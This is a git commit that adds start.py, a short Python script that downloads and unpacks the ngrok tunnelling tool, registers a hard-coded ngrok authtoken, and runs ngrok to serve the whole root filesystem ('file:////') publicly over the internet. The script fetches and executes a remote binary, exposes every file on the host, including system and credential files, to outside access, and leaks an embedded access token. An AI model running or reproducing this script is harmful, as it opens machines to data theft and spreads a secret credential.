67d55148d56d8946743e807c77f312205d256506
developer7292774 <94847369+developer7292774@users.noreply.github.com>
2021-12-14 15:14:59 +0600

    Create start.py

---
+++ start.py
@@ -0,0 +1,6 @@
+import os
+
+os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz")
+os.system("tar -xzvf ngrok-stable-linux-386.tgz")
+os.system("./ngrok authtoken 21C37ILhHmrN3LpkxWNBZ3p9TTq_4XquCTmDafA1ko2ETvKYR")
+os.system("./ngrok http file:////")
